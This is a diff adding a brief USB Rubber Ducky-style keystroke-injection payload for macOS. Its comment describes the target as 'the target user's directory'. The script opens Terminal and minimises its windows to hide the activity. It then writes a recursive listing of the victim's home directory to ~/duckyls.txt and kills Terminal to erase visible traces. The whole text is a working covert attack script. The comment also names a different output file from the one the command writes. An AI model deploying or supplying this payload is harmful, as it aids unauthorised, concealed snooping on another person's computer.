@@ -1,0 +1,9 @@
+REM This is a script for MacOS that opens Terminal.app and saves the contents of the target user's directory to duckls.txt
+
+DELAY 1000
+GUI SPACE
+STRING Terminal
+ENTER
+DELAY 1500
+STRING osascript -e 'tell application "Terminal" to set miniaturized of every window to true' & ls -R ~ >> ~/duckyls.txt; killall Terminal
+ENTER
